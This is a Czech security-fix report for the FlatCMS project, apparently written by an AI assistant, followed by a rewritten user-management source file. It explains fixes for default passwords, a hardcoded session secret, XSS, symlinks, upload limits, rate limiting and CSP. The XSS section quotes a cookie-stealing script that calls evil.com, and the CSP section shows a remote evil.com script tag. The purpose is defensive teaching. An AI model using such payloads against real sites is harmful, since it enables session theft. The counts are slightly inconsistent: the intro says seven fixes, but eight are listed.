# Etapa 1 — Bezpečnostní opravy

**Datum:** 24. 9. 2026
**Projekt:** FlatCMS (flatcms-claude-opus-5-medium)
**Autor oprav:** Jan Hošek + Better DeepSeek

Tento dokument vysvětluje **7 kritických bezpečnostních chyb**, které jsme našli v původním kódu, a jak jsme je opravili. Ke každé opravě je:

- **Co bylo špatně** — popis v jednoduché češtině
- **Proč to bylo nebezpečné** — scénář zneužití
- **Co dělat** — co zkopírovat a kam
- **Poučení** — obecný princip, který si odnést

---

## Přehled oprav

| # | Chyba | Soubor | Riziko |
|---|-------|--------|--------|
| 1 | Výchozí účty s hesly `admin123` | `src/lib/users.ts` | 🔴 Kritické |
| 2 | Zobrazování hesel na přihlašovací stránce | `src/app/admin/login/LoginForm.tsx` | 🔴 Kritické |
| 3 | Slabý fallback pro `FLATCMS_SECRET` | `src/lib/auth.ts` | 🔴 Kritické |
| 4 | Žádná sanitizace Markdownu → XSS | `src/lib/render.ts` | 🔴 Kritické |
| 5 | Žádná kontrola symlinků v `safeJoin` | `src/lib/paths.ts` | 🟡 Důležité |
| 6 | Žádný limit velikosti uploadu | `src/app/api/media/upload/route.ts` | 🟡 Důležité |
| 7 | Žádný rate limiting na přihlášení | `src/lib/rate-limit.ts` (nový) | 🟡 Důležité |
| 8 | Chybí CSP hlavičky | `src/middleware.ts` (nový) | 🟡 Důležité |

---

## OPRAVA 1 — Výchozí účty s pevným heslem

### Co bylo špatně

Soubor `src/lib/users.ts` obsahoval funkci `defaultUsers()`, která při prvním spuštění vytvořila tři účty:

```

admin  / admin123
editor / editor123
autor  / autor123

```

Tato funkce se zavolá **vždy, když soubor `data/users.json` neexistuje** — což nastane například po smazání dat, po čistém nasazení, po obnově ze zálohy, kde soubor chyběl.

### Proč to bylo nebezpečné

Představ si scénář: Nasadíš CMS na server. Zapomeneš zkontrolovat, jestli `data/users.json` je na místě. CMS si ho vygeneruje sám — s účtem `admin` a heslem `admin123`.

**Kdokoliv na světě** teď může zkusit `admin / admin123` — a dostane se do tvé administrace. Tomu se říká **„default credentials attack"** a je to **nejčastější reálná příčina prolomení CMS**.

### Jak jsme to opravili

- Funkce `defaultUsers()` byla **odstraněna**.
- Místo ní je funkce `ensureInitialAdmin()`, která:
  1. Podívá se, jestli existuje `data/users.json`.
  2. Pokud ne, přečte z prostředí `CMS_ADMIN_USERNAME`, `CMS_ADMIN_EMAIL`, `CMS_ADMIN_PASSWORD`.
  3. Pokud `CMS_ADMIN_PASSWORD` **není nastaveno**, vygeneruje **náhodné silné heslo** a **vypíše ho do konzole serveru** (jednorázově — musíš si ho opsat).
  4. Pokud je nastaveno, použije ho.
- Účty `editor` a `autor` už se nevytvářejí automaticky — vytvoříš si je sám v administraci, až je budeš potřebovat.

### Co dělat

1. Nahraď soubor `src/lib/users.ts` novým (viz ZIP).
2. Do souboru `.env.local` v kořeni projektu přidej:
```

CMS_ADMIN_USERNAME=admin
CMS_ADMIN_EMAIL=vas@email.cz
CMS_ADMIN_PASSWORD=silne-heslo-min-12-znaku

```
3. Pokud už máš `data/users.json`, **smaž ho** a nech CMS vygenerovat nový — pak si nastav heslo v administraci.

### Poučení

> **Nikdy** nedávej do kódu výchozí přihlašovací údaje. Ani jako „demo", ani jako „pro první spuštění". Když musíš, vygeneruj **náhodné** a nech je uživatele opsat.

---

## OPRAVA 2 — Zobrazování hesel na přihlašovací stránce

### Co bylo špatně

Soubor `src/app/admin/login/LoginForm.tsx` zobrazoval na přihlašovací stránce tento blok:

```

Demo účty:
admin / admin123 — administrátor
editor / editor123 — editor
autor / autor123 — autor

```

### Proč to bylo nebezpečné

Dvě roviny:

1. **Pokud jsi nechal demo účty aktivní** (viz Oprava 1), kdokoliv vidí přihlašovací stránku, má rovnou **návod, jak se přihlásit**.
2. **I kdyby účty byly smazané**, tenhle blok je **informační únik** — prozradí útočníkovi, jaká uživatelská jména v systému existují (může zkusit `admin`, `editor` s jinými hesly).

### Jak jsme to opravili

Blok „Demo účty" byl **zcela odstraněn**. Přihlašovací stránka teď obsahuje jen pole pro jméno a heslo.

### Co dělat

Nahraď soubor `src/app/admin/login/LoginForm.tsx` novým.

### Poučení

> Přihlašovací stránka **nesmí prozrazovat nic** o vnitřním stavu systému. Ani jména, ani počet uživatelů, ani to, jestli je to poprvé spuštěné.

---

## OPRAVA 3 — Slabý fallback pro `FLATCMS_SECRET`

### Co bylo špatně

Soubor `src/lib/auth.ts` používal pro podepisování session cookies tento kód:

```ts
function secret(): string {
  return process.env.FLATCMS_SECRET || "flatcms-dev-secret-change-me";
}
```

Pokud jsi `FLATCMS_SECRET` nenastavil, systém **potichu** použil řetězec `"flatcms-dev-secret-change-me"`.

### Proč to bylo nebezpečné

Každý si může vytvořit vlastní session cookie, protože **zná tajný klíč** (je ve zdrojovém kódu). Stačí mu:

1. Vzít si cookie, kterou dostal jako nepřihlášený uživatel.
2. Přehmátnout ji na `admin` s vlastním podpisem (protože klíč zná z GitHubu).
3. Server ji přijme jako platnou.

**Útočník se stane administrátorem bez znalosti hesla.**

### Jak jsme to opravili

Funkce `secret()` nyní **vyhodí chybu při startu aplikace**, pokud `FLATCMS_SECRET` chybí nebo je kratší než 32 znaků. **Aplikace se prostě nespustí.** Je to nekompromisní, ale bezpečné.

Navíc: v produkčním módu vyžadujeme alespoň 32 znaků, v dev módu stačí 16, ale i tak dostaneš varování do konzole.

### Co dělat

1. Nahraď soubor `src/lib/auth.ts` novým.
2. Vygeneruj si silný klíč. V terminálu:

```
node -e "console.log(require('crypto').randomBytes(48).toString('hex'))"
```
3. Vlož výsledek do `.env.local`:

```
FLATCMS_SECRET=<sem-vloz-ten-dlouhy-retezec>
```

### Poučení

> **Tajné klíče nikdy nemají fallback.** Když chybí, je to chyba konfigurace — a aplikace musí spadnout, ne jet s výchozím klíčem.

---

## OPRAVA 4 — Žádná sanitizace Markdownu → XSS

### Co bylo špatně

Soubor `src/lib/render.ts` převáděl Markdown na HTML pomocí knihovny `marked` a výsledek rovnou vracel:

```
html = marked.parse(article.content ?? "") as string;
```

`marked` **zachová** libovolné HTML, které v Markdownu najde. A ve veřejném webu se výsledek vkládal přes `dangerouslySetInnerHTML`.

### Proč to bylo nebezpečné

Scénář:

1. Ty (nebo jiný autor) napíšeš do článku:

```
<script>fetch('https://evil.com?c=' + document.cookie)</script>
```
2. CMS to uloží.
3. Návštěvník webu otevře článek — jeho prohlížeč skript **spustí**.
4. Skript pošle cookies útočníkovi → ten se dostane do administrace.

Tomu se říká **stored XSS** (uložené cross-site scripting). Je to jedna z **TOP 3 chyb v OWASP Top 10**.

### Jak jsme to opravili

Přidali jsme **sanitizaci** pomocí `isomorphic-dompurify`. Tato knihovna:

- **Odstraní** všechny `<script>` tagy.
- **Odstraní** všechny `onclick`, `onerror` a další event handlery.
- **Odstraní** `javascript:` URL v odkazech.
- **Povolí** jen bezpečné tagy (nadpisy, odstavce, seznamy, obrázky, tabulky).
- **Povolí** jen YouTube a Vimeo iframy (pro videa v článcích).

Sanitizace probíhá **na serveru** ve funkci `renderArticleHtml()` — ještě než se HTML pošle do prohlížeče.

### Co dělat

1. Nahraď soubor `src/lib/render.ts` novým.
2. Nainstaluj novou závislost:

```
npm install isomorphic-dompurify
```

### Poučení

> **Veškerý uživatelský obsah, který se vykresluje jako HTML, musí projít sanitizací.** Bez výjimky. Ani „důvěryhodný" autor není důvěryhodný — jeho účet může být ukraden.

---

## OPRAVA 5 — Chybějící kontrola symlinků

### Co bylo špatně

Soubor `src/lib/paths.ts` obsahoval funkci `safeJoin`, která bránila path traversal (`../../../etc/passwd`). Ale **nekontrolovala symlinky**.

### Proč to bylo nebezpečné

Pokud útočník dokáže vytvořit symlink (`public/uploads/hack -> /etc`), může přes API pro práci se soubory číst libovolné soubory na serveru — třeba `/etc/passwd` nebo konfigurační soubory s hesly.

Pravděpodobnost je nižší (musí mít přístup k souborovému systému), ale je to princip: **soubory, které jsi nedal do systému ty, nejsou tvoje.**

### Jak jsme to opravili

Přidali jsme funkci `assertNoSymlinks()`, která projde **každou část cesty** od základu dolů a zkontroluje, že ani jedna není symlink. Pokud najde symlink, operace se odmítne.

### Co dělat

Nahraď soubor `src/lib/paths.ts` novým.

### Poučení

> **Nikdy nedůvěřuj souborovému systému, že je „čistý".** Symlink je útočníkův trik, jak obejít kontrolu cest.

---

## OPRAVA 6 — Chybějící limit velikosti uploadu

### Co bylo špatně

API endpoint `/api/media/upload` přijímal soubory **jakékoliv velikosti**.

### Proč to bylo nebezpečné

1. **DoS (Denial of Service):** Útočník pošle 10 GB soubor → server zaplní disk → aplikace spadne.
2. **Memory exhaustion:** Načtení celého souboru do paměti pomocí `Buffer.from(await file.arrayBuffer())` u velkého souboru **shodí Node.js proces** (typicky má 1–2 GB heap).

### Jak jsme to opravili

Před načtením souboru do paměti:

- Zkontrolujeme **velikost jednotlivého souboru** (limit 20 MB).
- Zkontrolujeme **celkovou velikost requestu** (limit 50 MB).
- Zkontrolujeme **počet souborů** v jednom requestu (limit 20).

Pokud je některý limit překročen, request se odmítne **před** načtením do paměti.

### Co dělat

Nahraď soubor `src/app/api/media/upload/route.ts` novým.

### Poučení

> **Každý vstup od uživatele má svůj limit.** Velikost, počet, typ. Bez limitu je to pozvánka k DoS.

---

## OPRAVA 7 — Rate limiting na přihlášení

### Co bylo špatně

Endpoint pro přihlášení neměl **žádné omezení počtu pokusů**.

### Proč to bylo nebezpečné

Útočník může programem zkoušet **tisíce hesel za sekundu** (brute-force útok). Moderní hardware zvládne 10 000+ pokusů/hodinu proti běžnému heslu.

### Jak jsme to opravili

Přidali jsme soubor `src/lib/rate-limit.ts` s **in-memory limiterem**:

- Maximálně **5 neúspěšných pokusů za 15 minut** na kombinaci IP + uživatelské jméno.
- Po úspěšném přihlášení se počítadlo vynuluje.
- Záznamy se automaticky čistí každých 5 minut.

**Poznámka:** Toto je jednoduchá ochrana. Pro produkci se doporučuje kombinovat s **rate limitingem na proxy vrstvě** (Nginx `limit_req`), protože in-memory limiter se resetuje při restartu serveru.

### Co dělat

1. Zkopíruj nový soubor `src/lib/rate-limit.ts`.
2. V souboru `src/app/actions.ts` přidej na začátek `loginAction()`:

```
import { checkLoginRateLimit, recordLoginFailure, recordLoginSuccess } from "@/lib/rate-limit";
// ...
const ip = (await headers()).get("x-forwarded-for") ?? "unknown";
const key = `${ip}:${username}`;
const rl = checkLoginRateLimit(key);
if (!rl.allowed) {
  return { ok: false, error: `Příliš mnoho pokusů. Zkuste to za ${rl.retryAfterSec} s.` };
}
try {
  await login(username, password);
  recordLoginSuccess(key);
} catch (err) {
  recordLoginFailure(key);
  return fail(err);
}
```

### Poučení

> **Každá autentizace potřebuje rate limiting.** Bez něj je brute-force otázka minut, ne let.

---

## OPRAVA 8 — Chybějící bezpečnostní hlavičky (CSP)

### Co bylo špatně

Server neposílal žádné bezpečnostní HTTP hlavičky.

### Proč to bylo nebezpečné

Bez **Content-Security-Policy (CSP)** může prohlížeč načítat skripty z libovolné domény. Když se útočníkovi podaří vložit `<script src="https://evil.com/x.js">`, prohlížeč ho **načte a spustí**.

Bez **X-Content-Type-Options** může prohlížeč „hádat" typ souboru a spustit `.txt` jako JavaScript.

### Jak jsme to opravili

Přidali jsme soubor `src/middleware.ts`, který na **každou odpověď** přidá:

- `Content-Security-Policy` — povoluje skripty jen z vlastní domény, zakazuje `object-src`, omezuje `frame-src` na YouTube a Vimeo
- `X-Content-Type-Options: nosniff` — zakazuje „hádání" typu
- `Referrer-Policy: strict-origin-when-cross-origin` — omezuje únik URL v Referer hlavičce
- `Permissions-Policy` — zakazuje kameru, mikrofon, geolokaci

### Co dělat

1. Zkopíruj nový soubor `src/middleware.ts`.
2. Restartuj vývojový server (`npm run dev`).

### Poučení

> **Bezpečnostní hlavičky jsou zdarma a chrání proti celé třídě útoků.** Vždy je zapni, než pustíš web na internet.

---

## Shrnutí — co jsi se naučil

1. **Výchozí údaje** = pozvánka pro útočníka. Vždy náhodné nebo z prostředí.
2. **Nikdy nezobrazuj** přihlašovací údaje na přihlašovací stránce.
3. **Tajné klíče** nemají fallback. Chybí = spadni.
4. **Sanitizuj** každý HTML výstup. Vždy.
5. **Symlinky** jsou cesta, jak obejít kontrolu cest.
6. **Limituj** velikost a počet vstupů od uživatele.
7. **Rate limiting** na autentizaci je povinný.
8. **Bezpečnostní hlavičky** jsou první obranná linie.

Těchto 8 pravidel je **minimum**, které musí mít každý web, než ho pustíš na internet. WordPress tohle řeší pluginy (Wordfence, iThemes Security), my to máme v jádře.

---

## Další kroky

Tato várka oprav (Etapa 1) je **hotová**. Co dál:

- **Etapa 2:** Rozšíření hooků z 8 na ~24 (rozšíříme plugin API)
- **Etapa 3:** Výměna `contentEditable` editoru za moderní (Tiptap nebo Lexical)
- **Etapa 4:** Activity log, zálohy článků, testy, nasazení

Ale nejdřív si **projdi tyhle opravy** — zkopíruj soubory, nastav `.env.local`, spusť `npm install` a zkus, jestli všechno funguje. Až budeš mít otázky, ptej se.

Hodně štěstí, Jane. 💪

</BDS:create_file>

<BDS:create_file fileName="src/lib/users.ts">

```typescript
/**
 * FlatCMS – správa uživatelů
 *
 * Ukládá uživatele do data/users.json. Hesla jsou hashovaná algoritmem scrypt
 * (salt:hash). Při prvním spuštění vytváří administrátora s náhodným nebo
 * z prostředí nakonfigurovaným heslem. Žádné výchozí přihlašovací údaje!
 *
 * Licence: GPLv3
 */

import crypto from "node:crypto";
import type { PublicUser, User, UserRole, EditorType } from "./types";
import { readJson, writeJson } from "./store";

const FILE = "users.json";
const MIN_PASSWORD_LENGTH = 12;

/* ---------------- Hashování hesel ---------------- */

export function hashPassword(password: string): string {
  const salt = crypto.randomBytes(16).toString("hex");
  const hash = crypto.scryptSync(password, salt, 64).toString("hex");
  return `${salt}:${hash}`;
}

export function verifyPassword(password: string, stored: string): boolean {
  const [salt, hash] = (stored || "").split(":");
  if (!salt || !hash) return false;
  const candidate = crypto.scryptSync(password, salt, 64).toString("hex");
  const a = Buffer.from(candidate, "hex");
  const b = Buffer.from(hash, "hex");
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

/* ---------------- Bootstrap prvního administrátora ---------------- */

/**
 * Zajistí, že existuje alespoň jeden administrátorský účet.
 *
 * Pořadí priorit:
 *  1. Pokud existuje data/users.json, nic se nedělá.
 *  2. Jinak se použije CMS_ADMIN_PASSWORD z prostředí.
 *  3. Pokud chybí, vygeneruje se náhodné 32znakové heslo
 *     a VYPÍŠE SE DO KONZOLE (jednorázově).
 *
 * Tím se zabrání tomu, aby měl systém pevně dané výchozí heslo.
 */
export async function ensureInitialAdmin(): Promise<void> {
  const file = await getUsersRaw();
  if (file !== null) return; // už existuje

  const username = process.env.CMS_ADMIN_USERNAME?.trim() || "admin";
  const email = process.env.CMS_ADMIN_EMAIL?.trim() || "admin@localhost";
  const passwordFromEnv = process.env.CMS_ADMIN_PASSWORD;

  let password: string;
  let generated = false;

  if (passwordFromEnv && passwordFromEnv.length >= MIN_PASSWORD_LENGTH) {
    password = passwordFromEnv;
  } else if (passwordFromEnv) {
    // Uživatel nastavil heslo, ale je krátké – odmítneme start
    throw new Error(
      `CMS_ADMIN_PASSWORD je příliš krátké (minimum ${MIN_PASSWORD_LENGTH} znaků). ` +
        `Buď nastavte delší heslo, nebo proměnnou odstraňte – systém si vygeneruje náhodné.`,
    );
  } else {
    password = crypto.randomBytes(24).toString("base64url");
    generated = true;
  }

  const now = new Date().toISOString();
  const admin: User = {
    id: crypto.randomUUID(),
    username: username.toLowerCase(),
    passwordHash: hashPassword(password),
    displayName: "Hlavní administrátor",
    email,
    role: "administrator",
    createdAt: now,
    preferredEditor: "markdown",
  };

  await writeJson(FILE, [admin]);

  if (generated) {
    // Jednorázový výpis do konzole – uživatel si musí heslo opsat!
    // Toto je jediné místo, kde se heslo zobrazí v plaintextu.
    // eslint-disable-next-line no-console
    console.log("\n" + "=".repeat(70));
    // eslint-disable-next-line no-console
    console.log("  FLATCMS – PRVNÍ SPUŠTĚNÍ");
    // eslint-disable-next-line no-console
    console.log("=".repeat(70));
    // eslint-disable-next-line no-console
    console.log(`  Uživatelské jméno:  ${admin.username}`);
    // eslint-disable-next-line no-console
    console.log(`  Email:              ${admin.email}`);
    // eslint-disable-next-line no-console
    console.log(`  HESLO (opsat!):     ${password}`);
    // eslint-disable-next-line no-console
    console.log("");
    // eslint-disable-next-line no-console
    console.log("  Toto heslo se už nikdy nezobrazí. Uložte si ho bezpečně");
    // eslint-disable-next-line no-console
    console.log("  a po prvním přihlášení si nastavte vlastní v administraci.");
    // eslint-disable-next-line no-console
    console.log("=".repeat(70) + "\n");
  } else {
    // eslint-disable-next-line no-console
    console.log(
      `[FlatCMS] Vytvořen výchozí administrátor '${admin.username}' s heslem z CMS_ADMIN_PASSWORD.`,
    );
  }
}

/* ---------------- Čtení a zápis ---------------- */

/** Vrátí pole uživatelů, nebo null, pokud soubor neexistuje. */
async function getUsersRaw(): Promise<User[] | null> {
  try {
    const { DATA_DIR, exists } = await import("./paths");
    const path = await import("node:path");
    if (!(await exists(path.join(DATA_DIR, FILE)))) return null;
  } catch {
    // Pokud paths není dostupné, nechme readJson rozhodnout
  }
  const raw = await readJson<User[] | null>(FILE, null);
  if (!Array.isArray(raw) || raw.length === 0) return null;
  return raw;
}

export async function getUsers(): Promise<User[]> {
  await ensureInitialAdmin();
  const users = (await getUsersRaw()) ?? [];
  return users;
}

export function toPublic(user: User): PublicUser {
  const { passwordHash: _p, ...rest } = user;
  void _p;
  return rest;
}

export async function getPublicUsers(): Promise<PublicUser[]> {
  return (await getUsers()).map(toPublic);
}

export async function findUserByUsername(username: string): Promise<User | undefined> {
  const users = await getUsers();
  return users.find((u) => u.username.toLowerCase() === username.trim().toLowerCase());
}

export async function findUserById(id: string): Promise<User | undefined> {
  return (await getUsers()).find((u) => u.id === id);
}

/* ---------------- Vytváření a úpravy ---------------- */

export interface CreateUserInput {
  username: string;
  password: string;
  displayName: string;
  email: string;
  role: UserRole;
  preferredEditor?: EditorType;
}

export async function createUser(input: CreateUserInput): Promise<PublicUser> {
  const users = await getUsers();
  const username = input.username.trim().toLowerCase();
  if (!username) throw new Error("Uživatelské jméno je povinné.");
  if (!input.password || input.password.length < MIN_PASSWORD_LENGTH) {
    throw new Error(`Heslo musí mít alespoň ${MIN_PASSWORD_LENGTH} znaků.`);
  }
  if (users.some((u) => u.username.toLowerCase() === username)) {
    throw new Error("Uživatel s tímto jménem již existuje.");
  }

  const user: User = {
    id: crypto.randomUUID(),
    username,
    passwordHash: hashPassword(input.password),
    displayName: input.displayName || username,
    email: input.email || "",
    role: input.role,
    createdAt: new Date().toISOString(),
    preferredEditor: input.preferredEditor ?? "markdown",
  };
  users.push(user);
  await writeJson(FILE, users);
  return toPublic(user);
}

export async function updateUser(
  id: string,
  patch: Partial<Omit<User, "id" | "passwordHash">> & { password?: string },
): Promise<void> {
  const users = await getUsers();
  const idx = users.findIndex((u) => u.id === id);
  if (idx < 0) throw new Error("Uživatel nenalezen.");

  const { password, ...rest } = patch;
  if (password !== undefined && password.length > 0 && password.length < MIN_PASSWORD_LENGTH) {
    throw new Error(`Heslo musí mít alespoň ${MIN_PASSWORD_LENGTH} znaků.`);
  }

  users[idx] = { ...users[idx], ...rest };
  if (password) users[idx].passwordHash = hashPassword(password);
  await writeJson(FILE, users);
}

export async function deleteUser(id: string): Promise<void> {
  const users = await getUsers();
  const target = users.find((u) => u.id === id);
  if (!target) return;
  if (
    target.role === "administrator" &&
    users.filter((u) => u.role === "administrator").length <= 1
  ) {
    throw new Error("Nelze smazat posledního administrátora.");
  }
  await writeJson(FILE, users.filter((u) => u.id !== id));
}

